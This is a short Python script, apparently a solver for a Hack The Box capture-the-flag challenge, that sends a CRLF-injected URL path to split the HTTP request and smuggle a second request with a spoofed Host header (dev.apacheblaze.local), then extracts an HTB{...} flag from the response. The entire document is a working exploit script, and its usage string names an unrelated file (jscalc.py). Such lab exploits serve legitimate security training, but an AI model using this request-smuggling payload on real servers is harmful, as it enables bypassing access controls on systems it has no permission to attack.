import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 jscalc.py ip:port")
    sys.exit(1)

host = sys.argv[1]

payload = "/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0a"

url = f"http://{host}{payload}"

try:
    r = requests.get(url, timeout=5)
    r.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f"Failed to send request: {e}")
    sys.exit(1)
flag = re.search(r"HTB\{.*?\}", r.text)

if flag:
    print(flag.group(0))
else:
    print("Flag not found")
